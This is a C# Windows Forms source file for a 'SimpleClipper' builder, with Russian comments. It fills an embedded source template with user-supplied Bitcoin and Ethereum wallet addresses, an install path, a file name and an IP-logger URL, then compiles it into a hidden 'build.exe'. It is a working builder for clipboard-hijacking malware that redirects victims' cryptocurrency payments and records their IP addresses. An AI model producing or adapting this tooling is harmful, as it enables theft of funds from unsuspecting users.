using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Windows.Forms;

namespace SimpleClipper
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            CompilerParameters Params = new CompilerParameters(); // Параметры компилируемой сборки
            Params.IncludeDebugInformation = false;
            Params.CompilerOptions = " /t:winexe /platform:x86";
            Params.OutputAssembly = "build.exe";

            Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            Params.ReferencedAssemblies.Add("System.dll");

            string Source = Properties.Resources.Source;
            Source = Source.Replace("[btcwallet1]", textBox1.Text);   // Заменяем нужные значения в сурсе
            Source = Source.Replace("[btcwallet2]", textBox2.Text);
            Source = Source.Replace("[ethwallet]", textBox3.Text);
            Source = Source.Replace("[path]", comboBox1.SelectedItem.ToString());
            Source = Source.Replace("[filename]", textBox4.Text);
            Source = Source.Replace("[iplogger]", textBox5.Text);


            var settings = new Dictionary<string, string>();
            settings.Add("CompilerVersion", "v4.0");

            CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Source);

            foreach (CompilerError Error in Results.Errors)  //Вывод ошибок
                MessageBox.Show(Error.ToString());

            
            MessageBox.Show("Done!", "Success");
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            comboBox1.SelectedIndex = 0;
        }
    }
}
